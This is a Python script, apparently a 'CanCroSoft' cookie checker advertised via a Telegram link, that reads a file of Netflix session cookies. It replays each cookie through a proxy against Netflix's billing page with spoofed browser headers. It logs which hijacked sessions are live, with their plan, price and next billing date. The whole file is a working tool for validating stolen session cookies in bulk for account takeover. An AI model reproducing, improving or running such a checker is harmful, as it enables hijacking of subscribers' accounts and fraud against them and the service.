import requests
from bs4 import BeautifulSoup
import re
import concurrent.futures
from time import sleep


def process_line(line, prox):
    if not (match := re.search(r"NetflixId\s+(.+)", line)):
        return
    netflixTK = match.group(1)
    retry_count = 1
    max_retries = 5
    while retry_count < max_retries:
        try:
            entry = prox
            proxies = {
                "http": entry,
                "https": entry,
            }

            url = "https://www.netflix.com/BillingActivity"

            headers = {
                "sec-ch-ua": '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
                "sec-ch-ua-mobile": "?0",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
                "sec-ch-ua-platform": '"Windows"',
                "accept": "*/*",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.netflix.com/browse",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US,en;q=0.9,pt;q=0.8",
                "cookie": f"NetflixId={netflixTK}",
            }

            response = requests.get(url, headers=headers, proxies=proxies)

            soup = BeautifulSoup(response.content, "html.parser")

            # Encontrar a div com as informações do plano e da próxima data de cobrança
            div_billing_summary = soup.find("div", class_="billingSummaryContents")

            # Verificar se a div foi encontrada
            if div_billing_summary is None:
                print("Cookie inválido ou expirado!")
            else:
                tipo_plano = div_billing_summary.find(
                    "div", attrs={"data-uia": "plan-name"}
                ).text.strip()
                valor_plano = div_billing_summary.find(
                    "span", attrs={"data-uia": "plan-total-amount"}
                ).text.strip()
                proxima_data_cobranca = div_billing_summary.find(
                    "div", attrs={"data-uia": "streaming-next-cycle"}
                ).text.strip()
                print(
                    "Cookie NETFLIX by CanCroSoft TM\n",
                    line,
                    "\n-> Tipo de plano:",
                    tipo_plano,
                    " | Valor do plano:",
                    valor_plano,
                    " | Próxima data de cobrança:",
                    proxima_data_cobranca,
                    "\nhttps://t.me/cancSoftmTeam\n",
                )
                with open(
                    "cookieslive/NetflixLiveCookies.txt", "a+", encoding="utf-8"
                ) as s:
                    s.write(
                        "Cookie NETFLIX by CanCroSoft TM\n"
                        + line
                        + "\n-> Tipo de plano:"
                        + tipo_plano
                        + " | Valor do plano:"
                        + valor_plano
                        + " | Próxima data de cobrança:"
                        + proxima_data_cobranca
                        + "\nhttps://t.me/cancSoftmTeam\n\n============================\n"
                    )
        except Exception as e:
            print(
                "[ ! ] ERRO DE REQUISIÇÃO - RETESTANDO!",
                f" [{retry_count}/{max_retries}]",
            )
            retry_count += 1
            sleep(2)  # Wait a bit


with open("db/netflix.txt", "r") as file:  # PUT NAME OF YOUR COOKIE DB HERE
    lines = file.readlines()

prox = "YOURPROXY HERE"

with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
    executor.map(process_line, lines, [prox] * len(lines))
